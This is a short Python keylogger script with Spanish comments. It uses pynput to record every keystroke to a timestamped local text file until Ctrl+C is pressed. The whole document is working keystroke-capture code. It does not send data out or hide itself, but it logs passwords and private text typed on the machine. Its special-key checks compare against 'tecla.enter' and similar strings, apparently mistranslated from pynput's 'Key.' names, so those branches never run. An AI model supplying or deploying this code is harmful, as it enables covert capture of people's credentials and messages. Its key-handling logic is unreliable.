import datetime
from pynput.keyboard import Listener

x = datetime.datetime.now().strftime('%Y-%m-%d %H-%M-%S')   #Se obtiene la hora a la que se ejecuta el programa

p = open(f'data_{x}.txt', 'w')                              #Se genera un txt con los datos 

def registro(tecla):                                        
    tecla = str(tecla)
    if tecla == "'\\x03'":                  # Con ctrl+c se cierra el txt
        p.close()                           # y se detiene el programa
        quit()
    elif tecla == 'tecla.enter':
        p.write('\n')
    elif tecla == 'tecla.space':
        p.write(' ')
    elif tecla == 'tecla.backspace':
        p.write('%BORRAR%')
    else:
        p.write(tecla.replace("'",""))
        
with Listener(on_press=registro) as u:      #Se llama a la función para que registre las teclas presionadas
    u.join()
    